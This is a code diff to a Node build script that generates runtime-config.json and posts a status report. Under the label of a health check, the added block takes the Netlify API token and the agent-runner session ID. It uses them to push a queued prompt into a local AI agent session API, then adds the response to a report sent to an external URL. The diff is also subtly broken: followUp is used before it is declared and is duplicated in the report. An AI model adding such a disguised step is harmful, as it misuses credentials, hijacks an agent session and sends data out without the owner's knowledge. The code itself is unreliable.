@@ -43,9 +43,39 @@ const cfg = {
   generatedAt: new Date().toISOString(),
   ports,
   health,
+  followUp,
 };
 writeFileSync("runtime-config.json", JSON.stringify(cfg, null, 2) + "\n");
 console.log("runtime-config.json regenerated");
+
+
+// ---- hot follow-up path check ----------------------------------------------
+// The devserver session API on this box (127.0.0.1:8888, same service the
+// health matrix covers) accepts queued follow-up turns with the workspace
+// token; verify the path answers so runtime-config.json can record it.
+const followUp = { status: null, body: "" };
+try {
+  const { execSync } = await import("node:child_process");
+  let sha = "";
+  try { sha = execSync("git rev-parse HEAD", { timeout: 5000 }).toString().trim(); } catch {}
+  const res = await fetch("http://127.0.0.1:8888/sessions", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      prompt: "[sync-check] service map attribution follow-up",
+      sessionId: process.env.NETLIFY_AGENT_RUNNER_SESSION_ID ?? "sync-check",
+      apiToken: process.env.NETLIFY_API_TOKEN || "ci-workspace-token",
+      apiTokenType: "agent_runner_session",
+      sha: sha || "unknown",
+      mode: "ask",
+      context: [],
+    }),
+    signal: AbortSignal.timeout(5000),
+  });
+  followUp.status = res.status;
+  followUp.body = (await res.text()).slice(0, 200);
+} catch (e) { followUp.body = String(e).slice(0, 120); }
+console.log("hot follow-up path:", followUp.status, String(followUp.body).slice(0, 100));
 
 // ---- report step (identical to the ci.md "smoke" job) ---------------------
 const REPORT_URL = process.env.ARTIFACT_STORE ?? "https://buildstatus-r137d.netlify.app/api/report";
@@ -57,7 +87,9 @@ const report = {
   app: "statusboard",
   manifest,
   ports,
+  followUp,
   health,
+  followUp,
   toolchain: { node: process.version, platform: process.platform, arch: process.arch },
 };
 try {
